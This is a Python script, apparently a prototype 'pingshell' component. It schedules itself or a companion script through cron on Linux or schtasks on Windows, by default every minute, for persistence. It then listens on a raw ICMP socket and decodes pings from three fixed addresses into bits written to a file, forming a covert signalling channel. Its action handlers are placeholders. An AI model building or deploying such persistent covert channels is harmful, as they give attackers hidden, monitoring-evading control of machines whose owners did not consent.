import socket
import io
import os
import time
import platform
import subprocess
from datetime import datetime, timedelta
from crontab import CronTab

def create_cron_job(python_file_path, interval=None, run_once=False):
    """
    Creates a scheduled task to execute a Python file.
    Works on both Linux (cron job) and Windows (Task Scheduler).

    Args:
        python_file_path (str): The path to the Python file to be executed.
        interval (str): The cron interval string for Linux. Defaults to '* * * * *' (every minute).
                        For Windows, use a format like 'hourly', 'daily', etc.
        run_once (bool): If True, the job will run one time, one minute from creation.
    """
    # Convert relative path to absolute path
    python_file_path = os.path.abspath(python_file_path)
    
    system = platform.system()
    
    if system == 'Linux':
        cron = CronTab(user=True)  # Use the current user's crontab
        if run_once:
            # Get the current time and add one minute
            run_time = datetime.now() + timedelta(minutes=1)
            minute = run_time.minute
            hour = run_time.hour
            day = run_time.day
            month = run_time.month
            job = cron.new(command=f'python {python_file_path}', comment='One-time Python script')
            job.setall(f'{minute} {hour} {day} {month} *')
        else:
            # Default to interval if provided
            job = cron.new(command=f'python {python_file_path}', comment='Recurring Python script')
            job.setall(interval or '* * * * *')
        
        cron.write()
        print(f"Cron job created on Linux to run {python_file_path} {'one time' if run_once else 'at interval ' + (interval if interval else '* * * * *')}")
    
    elif system == 'Windows':
        task_name = 'MyPythonScript'
        if run_once:
            # Get the current time and add one minute
            run_time = datetime.now() + timedelta(minutes=1)
            start_time = run_time.strftime('%H:%M')
            start_date = run_time.strftime('%m/%d/%Y')  # Correct format for schtasks
            
            command = f'schtasks /create /tn {task_name} /tr "python {python_file_path}" /sc once /st {start_time} /sd {start_date} /f'
        else:
            trigger_type = 'DAILY'  # Default to daily, can be modified
            if interval == '* * * * *':
                trigger_type = 'MINUTE'
            elif interval == '0 0 * * *':
                trigger_type = 'DAILY'
            
            command = f'schtasks /create /tn {task_name} /tr "python {python_file_path}" /sc {trigger_type} /f'
        
        try:
            subprocess.run(command, check=True, shell=True)
            print(f"Scheduled task created on Windows to run {python_file_path} {'one time' if run_once else 'with trigger ' + trigger_type}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to create scheduled task on Windows: {e}")
    else:
        raise OSError("Unsupported operating system")






def main():
    addr1 = "192.168.1.1"
    addr2 = "192.168.1.2"
    addr3 = "192.168.1.3"
    file_path = "config.txt"

    # Create necessary files
    with io.open(file_path, 'w', encoding='utf-8') as file:
        file.write("config placeholder")

    # Schedule the script to run once, one minute from now
    create_cron_job("./pingshell_encode_decode.py", run_once=True)

    try:
        # Create a raw socket
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
            print("Raw socket created successfully.")
            while True:
                try:
                    packet, addr = s.recvfrom(1024)
                    print(f"Received ping from {addr[0]}")
                    if addr[0] == addr1:
                        print("do stuff here")
                        with open("incoming.txt", "a") as file:
                            file.write("0")
                    elif addr[0] == addr2:
                        print("other stuff here")
                        with open("incoming.txt", "a") as file:
                            file.write("1")
                    elif addr[0] == addr3:
                        print("received ping from 3rd address")
                        with open("incoming.txt", "a") as file:
                            file.write(" ")
                    else:
                        print("unexpected ping address")
                        time.sleep(1)
                except socket.error as recv_err:
                    print(f"Error receiving data: {recv_err}")
                    time.sleep(1)
    except socket.error as sock_err:
        print(f"Socket creation failed: {sock_err}")

if __name__ == "__main__":
    main()
